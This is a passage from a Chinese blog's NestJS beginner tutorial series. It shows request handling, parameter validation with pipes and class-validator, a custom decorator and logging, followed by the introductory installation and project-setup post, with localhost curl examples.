<p>编辑 students.controller.ts<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// students.controller.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; Body, Controller, Get, Post, Query &#125; <span class="keyword">from</span> <span class="string">'@nestjs/common'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; StudentDto &#125; <span class="keyword">from</span> <span class="string">'./dtos/students.dto'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; StudentsService &#125; <span class="keyword">from</span> <span class="string">'./students.service'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span>(<span class="string">'students'</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentsController &#123;</span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params"><span class="keyword">private</span> readonly studentsService: StudentsService</span>) &#123;&#125;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// @Get('who-are-you') ...</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Post</span>(<span class="string">'who-are-you'</span>)</span><br><span class="line">    whoAreYouPost(<span class="meta">@Body</span>() student: StudentDto) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.studentsService.ImStudent(student.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>命令行访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -d&quot;name=gdccwxx&quot;  http://127.0.0.1:3000/students/who-are-you</span><br><span class="line">// =&gt; Im student gdccwxx%  ✅</span><br></pre></td></tr></table></figure></p>
<p>post 方法传递的参数是通过请求 body 给到后台的。需要通过 <code>@Body</code> 装饰器解析 Body 中的数据。</p>
<h1 id="三、参数限制与转换"><a href="#三、参数限制与转换" class="headerlink" title="三、参数限制与转换"></a>三、参数限制与转换</h1><p>这部分其实用到了 <a href="https://docs.nestjs.com/pipes" target="_blank" rel="noopener">管道</a> 的概念，我们用基础管道来实现，更高阶用法将会放在第四章中</p>
<h2 id="Get-请求"><a href="#Get-请求" class="headerlink" title="Get 请求"></a>Get 请求</h2><p>get 请求需要用到 <code>ParseIntPipe</code>, 更多的内置管道列表可查看<a href="https://docs.nestjs.com/pipes#built-in-pipes" target="_blank" rel="noopener">这里</a></p>
<p>浏览器访问的 url 默认是 string 类型，<code>ParseIntPipe</code> 管道能将 string 类型转化成 number 类型</p>
<p>这次我们实现的是通过 id 查找学生姓名。</p>
<p>修改 students.service.ts<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// students.service.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; Injectable &#125; <span class="keyword">from</span> <span class="string">'@nestjs/common'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Injectable</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentsService &#123;</span><br><span class="line">    <span class="comment">// ImStudent...</span></span><br><span class="line"></span><br><span class="line">    getStudentName(id: <span class="built_in">number</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> ID_NAME_MAP = &#123;</span><br><span class="line">            <span class="number">1</span>: <span class="string">'gdccwxx'</span>,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ID_NAME_MAP[id] ?? <span class="string">'not found'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>修改 students.controller.ts<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Body, Controller, Get, Post, Query, ParseIntPipe &#125; <span class="keyword">from</span> <span class="string">'@nestjs/common'</span>;</span><br><span class="line"><span class="comment">// ... </span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span>(<span class="string">'students'</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentsController &#123;</span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params"><span class="keyword">private</span> readonly studentsService: StudentsService</span>) &#123;&#125;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// @Get('who-are-you') ..</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// @Post('who-are-you') ...</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Get</span>(<span class="string">'get-name-by-id'</span>)</span><br><span class="line">    getNameById(<span class="meta">@Query</span>(<span class="string">'id'</span>, ParseIntPipe) id: <span class="built_in">number</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.studentsService.getStudentName(id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>浏览器使用参数访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:3000/students/get-name-by-id?id=gdccwxx</span><br><span class="line">// =&gt; &#123;</span><br><span class="line">//     statusCode: 400,</span><br><span class="line">//     message: &quot;Validation failed (numeric string is expected)&quot;,</span><br><span class="line">//     error: &quot;Bad Request&quot;</span><br><span class="line">// &#125;  ❌</span><br><span class="line"></span><br><span class="line">http://localhost:3000/students/get-name-by-id?id=1</span><br><span class="line">// =&gt; gdccwxx  ✅</span><br></pre></td></tr></table></figure></p>
<p>当使用非法请求，导致无法转换时，NestJs 会将请求报错处理，而正确参数则会转换后调用调用相应函数。通过简单的装饰器引用， NestJs 框架就可以自动做了参数检查与转换了</p>
<h2 id="Post-请求"><a href="#Post-请求" class="headerlink" title="Post 请求"></a>Post 请求</h2><p>Post 请求略微有些不一样，要用到 class-validator</p>
<p>安装 class-validator<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i --save class-validator class-transformer</span><br></pre></td></tr></table></figure></p>
<p>修改 main.ts<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; NestFactory &#125; <span class="keyword">from</span> <span class="string">'@nestjs/core'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; ValidationPipe &#125; <span class="keyword">from</span> <span class="string">'@nestjs/common'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; AppModule &#125; <span class="keyword">from</span> <span class="string">'./app.module'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">bootstrap</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> app = <span class="keyword">await</span> NestFactory.create(AppModule);</span><br><span class="line">  app.useGlobalPipes(<span class="keyword">new</span> ValidationPipe());</span><br><span class="line">  <span class="keyword">await</span> app.listen(<span class="number">3000</span>);</span><br><span class="line">&#125;</span><br><span class="line">bootstrap();</span><br></pre></td></tr></table></figure></p>
<p>修改 student.dto.ts<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; IsNotEmpty, IsString &#125; <span class="keyword">from</span> <span class="string">'class-validator'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentDto &#123;</span><br><span class="line">    <span class="meta">@IsNotEmpty</span>()</span><br><span class="line">    <span class="meta">@IsString</span>()</span><br><span class="line">    name: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>通过命令行访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST  http://127.0.0.1:3000/students/who-are-you</span><br><span class="line">// =&gt; &#123;&quot;statusCode&quot;:400,&quot;message&quot;:[&quot;name must be a string&quot;,&quot;name should not be empty&quot;],&quot;error&quot;:&quot;Bad Request&quot;&#125;% ❌</span><br><span class="line"></span><br><span class="line">curl -X POST http://127.0.0.1:3000/students/who-are-you -H &apos;Content-Type: application/json&apos; -d &apos;&#123;&quot;name&quot;: 1&#125;&apos;</span><br><span class="line">// =&gt; &#123;&quot;statusCode&quot;:400,&quot;message&quot;:[&quot;name must be a string&quot;],&quot;error&quot;:&quot;Bad Request&quot;&#125;% ❌</span><br><span class="line"></span><br><span class="line">curl -X POST http://127.0.0.1:3000/students/who-are-you -H &apos;Content-Type: application/json&apos; -d &apos;&#123;&quot;name&quot;: &quot;gdccwxx&quot;&#125;&apos;</span><br><span class="line">// =&gt; Im student gdccwxx% ✅</span><br></pre></td></tr></table></figure></p>
<p>到此，参数校验部分也就完成。</p>
<h1 id="四、自定义装饰器"><a href="#四、自定义装饰器" class="headerlink" title="四、自定义装饰器"></a>四、自定义装饰器</h1><p>在 post 请求用到了大量的装饰器，系统装饰器能满足大部分场景，但是有些特定需求时，需要自定义装饰器。</p>
<p>例如这样一个场景：每个请求都会带上 <code>user</code> 字段。代表是谁做的请求，每次在代码里 getUser 是非常难受的事情，这时自定义装饰器就派上了用场。</p>
<p>新建 src/common/decorators.ts<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/common/decorators.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; createParamDecorator, ExecutionContext &#125; <span class="keyword">from</span> <span class="string">'@nestjs/common'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> User = createParamDecorator(</span><br><span class="line">  (data: unknown, ctx: ExecutionContext) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> request = ctx.switchToHttp().getRequest(); <span class="comment">// 拿到请求</span></span><br><span class="line">    <span class="keyword">return</span> request.body.user;</span><br><span class="line">  &#125;,</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
<p>修改 students.controller.ts<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Body, Controller, Get, Post, Query, ParseIntPipe &#125; <span class="keyword">from</span> <span class="string">'@nestjs/common'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; StudentsService &#125; <span class="keyword">from</span> <span class="string">'./students.service'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; User &#125; <span class="keyword">from</span> <span class="string">'../common/decorators'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span>(<span class="string">'students'</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentsController &#123;</span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params"><span class="keyword">private</span> readonly studentsService: StudentsService</span>) &#123;&#125;</span><br><span class="line">    <span class="comment">// @Get('who-are-you') ...</span></span><br><span class="line">    <span class="comment">// @Post('who-are-you') ...</span></span><br><span class="line">    <span class="comment">// @Get('get-name-by-id')...</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Post</span>(<span class="string">'who-is-request'</span>)</span><br><span class="line">    whoIsReq(<span class="meta">@User</span>() user: <span class="built_in">string</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>命令行访问<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://127.0.0.1:3000/students/who-is-request -H <span class="string">'Content-Type: application/json'</span> -d <span class="string">'&#123;"user": "gdccwxx"&#125;'</span></span><br><span class="line">// =&gt; gdccwxx% ✅</span><br></pre></td></tr></table></figure></p>
<p>通过自定义装饰器，并将其挂在函数上，代码就能优雅的获取是谁请求的借口。</p>
<h1 id="五、日志"><a href="#五、日志" class="headerlink" title="五、日志"></a>五、日志</h1><p>后台接口请求常伴随日志产生，日志对后台查问题至关重要。NestJs 框架也集成了日志，开箱即用。</p>
<p>使用日志分为三步:</p>
<ul>
<li>main.ts 引入 <code>Logger</code></li>
<li>模块引入日志组建: <code>private readonly logger = new Logger(StudentsService.name)</code>;</li>
<li>在需要打印的地方引入: this.logger.log(`student name is ${name}`);</li>
</ul>
<p>修改main.ts<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; NestFactory &#125; <span class="keyword">from</span> <span class="string">'@nestjs/core'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; ValidationPipe, Logger &#125; <span class="keyword">from</span> <span class="string">'@nestjs/common'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; AppModule &#125; <span class="keyword">from</span> <span class="string">'./app.module'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">bootstrap</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> app = <span class="keyword">await</span> NestFactory.create(AppModule, &#123;</span><br><span class="line">    logger: <span class="keyword">new</span> Logger(),</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></p>
<p>引用 Logger 组建<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Injectable, Logger &#125; <span class="keyword">from</span> <span class="string">'@nestjs/common'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Injectable</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentsService &#123;</span><br><span class="line">    <span class="keyword">private</span> readonly logger = <span class="keyword">new</span> Logger(StudentsService.name);</span><br><span class="line"></span><br><span class="line">    ImStudent(name?: <span class="built_in">string</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.logger.log(<span class="string">`student name is <span class="subst">$&#123;name&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Im student '</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    getStudentName(id: <span class="built_in">number</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.logger.log(<span class="string">`get student id is <span class="subst">$&#123;id&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">const</span> ID_NAME_MAP = &#123;</span><br><span class="line">            <span class="number">1</span>: <span class="string">'gdccwxx'</span>,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ID_NAME_MAP[id] ?? <span class="string">'not found'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>访问接口，控制台输出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://127.0.0.1:3000/students/who-are-you -H &apos;Content-Type: application/json&apos; -d &apos;&#123;&quot;name&quot;: &quot;gdccwxx&quot;&#125;&apos;</span><br></pre></td></tr></table></figure></p>
<p><img src="/nestJs/nest-js-tutorial-2/./log.png" alt="logger"></p>
<p>完整示例可以在 <a href="https://github.com/gdccwxx/nest-test" target="_blank" rel="noopener">github</a> 找到。</p>
<p>处理请求的基本方法就讲到这里，下一篇会讲解如何连接数据库并使用</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.gdccwxx.com/nestJs/nest-js-tutorial-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="gdccwxx">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gdccwxx">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/nestJs/nest-js-tutorial-1/" itemprop="url">NestJs 入门教程之一：初次上手</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-09-11T23:45:27+08:00">
                2021-09-11
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>自从 Node 出世以来，许多 Javascript 后端框架都曾处不穷，需求也十分庞大。</p>
<p><img src="/nestJs/nest-js-tutorial-1/./nodejs.png" alt="nodejs"></p>
<p>Node 做后端已经成为前端的重要业务，随着前端业务的不断更迭，Node 也在前端领域也逐渐站稳脚跟，市场招聘需求逐渐旺盛，企业都抢着要。</p>
<p>尽管 Node 框架已经逐渐完善，但是国外非常火的框架 NestJs 教程却十分稀缺，国内教程也都良莠不齐，对初次上手者十分不友好。</p>
<p>本系列文章主要讲我在工作中遇到的问题与解决方案，并梳理成教程方式，希望对初学者有用。目标是经过此个系列文章，能搭建一套 NestJs 在日常编码过程中会用到的功能。</p>
<p>考虑到 NestJs 功能比较多，本教程会选较为常用的功能，分为四次次连载。</p>
<p><img src="/nestJs/nest-js-tutorial-1/./nestjs.png" alt="nestjs"></p>
<h1 id="一、NestJs-是啥"><a href="#一、NestJs-是啥" class="headerlink" title="一、NestJs 是啥"></a>一、NestJs 是啥</h1><p>学习 NestJS 之前，先简单说一下，它到底是啥。</p>
<p>字面意思来讲，它是一个以 JS 代码的方式运行 JS 的框架。</p>
<p>从 <a href="https://nestjs.com/" target="_blank" rel="noopener">NestJs 官网</a> 来看，NestJS 是运行在服务端的一个 JS 框架。它运行时是 <code>JavaScript</code>，编程时使用<code>TypeScript</code>, 是结合灵活性、可扩展性的框架。并且结合了面向对象编程(OOP)、函数式编程(FP)和函数响应式编程(FRP)</p>
<p>它的特殊之处在于，以前使用 JS 方式写后台代码，现在通过写 TS, 再编译成 JS 运行。既包含了 JS 的灵活性，又有 TS 的约束。</p>
<h1 id="二、NestJS-的优势"><a href="#二、NestJS-的优势" class="headerlink" title="二、NestJS 的优势"></a>二、NestJS 的优势</h1><p>NestJS 最大的优势，是他基于 TypeScript。</p>
<p>后台接口需要清晰的入参和出参，需要对函数和接口强约束，维护时才能保证接口的可靠性。</p>
<p>而且，NestJs 的是基于 Express 的进行开发的，也就是说完美的复用成熟的生态，可以很方便的去市场找第三方包。</p>
<h1 id="三、知识准备"><a href="#三、知识准备" class="headerlink" title="三、知识准备"></a>三、知识准备</h1><p>由于 NestJs 是基于 Node 的环境，因此需要具备基础的知识。</p>
<ul>
<li>HTTP: 了解基本的 Get、Post 请求</li>
<li>Node：基本明白接口请求，知道服务与接口关系即可</li>
<li>Typescript：基本懂语法，能大致知道装饰器和 interface</li>
</ul>
<p>最好之前用过 Node 相关服务，使用 Node 搭建过后台服务，但这不是必要的。</p>
<h1 id="四、开发准备"><a href="#四、开发准备" class="headerlink" title="四、开发准备"></a>四、开发准备</h1><p>1、安装 Node 环境：访问 <a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">Node 下载地址</a>. 下载安装后，Node &gt;= 10.13.0 即可, 可通过命令行检查</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure>
<p>2、安装 NestJS cli</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i -g @nestjs/cli</span><br></pre></td></tr></table></figure>
<h1 id="五、Hello-World"><a href="#五、Hello-World" class="headerlink" title="五、Hello World"></a>五、Hello World</h1><h2 id="创建-nest-test-项目"><a href="#创建-nest-test-项目" class="headerlink" title="创建 nest-test 项目"></a>创建 nest-test 项目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// step1</span><br><span class="line">nest new nest-test</span><br><span class="line"></span><br><span class="line">// step2 Which package manager would you</span><br><span class="line">选择: npm</span><br></pre></td></tr></table></figure>
<h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><p>这样就得到了 src/ 目录为这样的文件列表了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">src</span><br><span class="line">  |- app.controller.spec.ts // controller 的测试文件</span><br><span class="line">  |- app.controller.ts      // controller，路由和预处理</span><br><span class="line">  |- app.module.ts          // module，为模块注册用</span><br><span class="line">  |- app.service.ts         // service 真正的逻辑</span><br><span class="line">  |- main.ts                // 程序入口</span><br></pre></td></tr></table></figure></p>
<p>NestJS 也主张的是 <a href="https://zh.wikipedia.org/wiki/MVC" target="_blank" rel="noopener">MVC</a> 的格式。</p>
<h2 id="module"><a href="#module" class="headerlink" title="module"></a>module</h2><p><img src="/nestJs/nest-js-tutorial-1/./module.png" alt="module"></p>
<p>module 的作用是在程序运行时给模块处理依赖。好处是所有模块的依赖都可以在 module 中清晰明了的知道引用还是被引用</p>
<h2 id="controller"><a href="#controller" class="headerlink" title="controller"></a>controller</h2><p><img src="/nestJs/nest-js-tutorial-1/./controllers.png" alt="controller"></p>
<p>controller 的作用是处理请求，所有的请求会先到 controller，再经 controller 调用其他模块业务逻辑</p>
<h2 id="service"><a href="#service" class="headerlink" title="service"></a>service</h2><p>是真正处理业务逻辑的地方，所有的业务逻辑都会在这里处理。它可经过 module 引用其他模块的service，也可经过 module 暴露出去。</p>
<h2 id="hello-world"><a href="#hello-world" class="headerlink" title="hello-world"></a>hello-world</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// step1: 进入目录</span><br><span class="line">cd nest-test</span><br><span class="line"></span><br><span class="line">// step2: 安装依赖或更新依赖</span><br><span class="line">npm install</span><br><span class="line"></span><br><span class="line">// step3: 运行程序</span><br><span class="line">npm run start</span><br></pre></td></tr></table></figure>
<p>最后浏览器访问url<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">访问: http://localhost:3000/</span><br><span class="line">// =&gt; Hello World!  ✅</span><br></pre></td></tr></table></figure></p>
<p>说明程序已经成功访问了！</p>
<h1 id="六、生成新模块"><a href="#六、生成新模块" class="headerlink" title="六、生成新模块"></a>六、生成新模块</h1><h2 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h2><p>能访问新模块了，再进一步期望生成文件夹和文件夹的模块。NestJS cli 也支持用命令行形式来创建，这样就不需要做重复的创建文件的动作了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nest g controller students</span><br><span class="line">nest g service students</span><br><span class="line">nest g module students</span><br></pre></td></tr></table></figure></p>
<h2 id="目录结构-1"><a href="#目录结构-1" class="headerlink" title="目录结构"></a>目录结构</h2><p>再命令行分别执行以上三条命令，src/ 目录变成了如下样子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">src</span><br><span class="line">  |- app.controller.spec.ts</span><br><span class="line">  |- app.controller.ts     </span><br><span class="line">  |- app.module.ts         </span><br><span class="line">  |- app.service.ts        </span><br><span class="line">  |- main.ts               </span><br><span class="line">  |- students/</span><br><span class="line">        |- students.controller.spec.ts</span><br><span class="line">        |- students.controller.ts     </span><br><span class="line">        |- students.module.ts         </span><br><span class="line">        |- students.service.spec.ts</span><br><span class="line">        |- students.service.ts</span><br></pre></td></tr></table></figure></p>
<h2 id="编辑文件"><a href="#编辑文件" class="headerlink" title="编辑文件"></a>编辑文件</h2><p>编辑如下文件:<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// students.service.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; Injectable &#125; <span class="keyword">from</span> <span class="string">'@nestjs/common'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Injectable</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentsService &#123;</span><br><span class="line">    ImStudent() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Im student'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// students.controller.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; Injectable &#125; <span class="keyword">from</span> <span class="string">'@nestjs/common'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Injectable</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentsService &#123;</span><br><span class="line">    ImStudent() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Im student'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重启服务, 加上 dev 就能监听文件修改了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run start:dev</span><br></pre></td></tr></table></figure></p>
